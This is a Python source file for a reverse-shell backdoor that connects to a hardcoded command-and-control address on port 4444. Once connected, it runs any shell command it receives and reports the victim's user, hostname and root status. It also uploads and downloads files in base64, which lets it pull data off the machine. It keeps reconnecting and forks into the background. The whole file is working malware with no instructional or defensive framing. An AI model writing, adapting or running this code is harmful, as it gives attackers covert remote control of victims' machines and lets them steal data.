#!/usr/bin/env python3
import socket
import subprocess
import os
import platform
import time
import json
import base64
import sys

# ======== YOUR WINDOWS IP ========
C2_IP = "192.168.1.167"
C2_PORT = 4444
# =================================

def get_system_info():
    """Collect comprehensive system information"""
    try:
        user = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        hostname = platform.node()
        system = f"{platform.system()} {platform.release()}"
        
        # Get current directory
        cwd = os.getcwd()
        
        # Get privileges
        is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
        
        return {
            "user": user,
            "hostname": hostname,
            "system": system,
            "cwd": cwd,
            "is_root": is_root,
            "arch": platform.machine(),
            "python_version": platform.python_version()
        }
    except:
        return {"error": "Could not gather system info"}

def execute_command(cmd):
    """Execute command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully"
    except Exception as e:
        return f"Command execution failed: {str(e)}"

def handle_special_commands(command):
    """Handle C2 special commands"""
    if command == "system_info":
        return json.dumps(get_system_info())
    
    elif command.startswith("upload "):
        # Format: upload filename filedata_base64
        parts = command.split(" ", 2)
        if len(parts) == 3:
            filename = parts[1]
            file_data = base64.b64decode(parts[2])
            with open(filename, 'wb') as f:
                f.write(file_data)
            return f"File uploaded: {filename}"
    
    elif command.startswith("download "):
        # Format: download filepath
        filepath = command[9:]
        try:
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            return file_data + "<END_FILE>"
        except:
            return "File not found<END_FILE>"
    
    return None

def connect():
    """Main connection loop"""
    while True:
        try:
            s = socket.socket()
            s.settimeout(30)
            s.connect((C2_IP, C2_PORT))
            
            # Main command loop
            while True:
                # Wait for command from C2
                command = s.recv(8192).decode().strip()
                if not command:
                    continue
                
                # Check for special commands
                special_response = handle_special_commands(command)
                if special_response is not None:
                    s.send(special_response.encode())
                    continue
                
                # Execute regular command
                if command.lower() == 'exit':
                    break
                
                output = execute_command(command)
                s.send(output.encode())
                
        except Exception as e:
            time.sleep(30)
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    # Run as background process
    if os.fork() == 0:
        connect()
